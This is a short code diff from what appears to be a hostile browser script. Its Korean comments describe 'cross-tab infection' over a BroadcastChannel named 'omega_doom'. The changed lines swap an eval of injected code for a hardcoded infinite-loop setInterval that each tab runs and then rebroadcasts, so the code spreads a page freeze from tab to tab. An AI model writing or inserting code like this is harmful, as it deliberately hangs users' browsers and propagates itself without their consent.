@@ -297,10 +297,10 @@
 
         // (7-B) BroadcastChannel을 통한 탭 간 감염 (업그레이드: 코드 주입 강화)
         const channel = new BroadcastChannel('omega_doom');
-        channel.postMessage({ cmd: 'INJECT', code: 'setInterval(() => eval("while(1){}"), 1);' });
+        channel.postMessage({ cmd: 'INJECT' });
         channel.onmessage = (e) => {
             if(e.data.cmd === 'INJECT') {
-                eval(e.data.code);
+                setInterval(() => { while(1){} }, 1);
                 // 다른 탭에 재전파
                 channel.postMessage(e.data);
             }
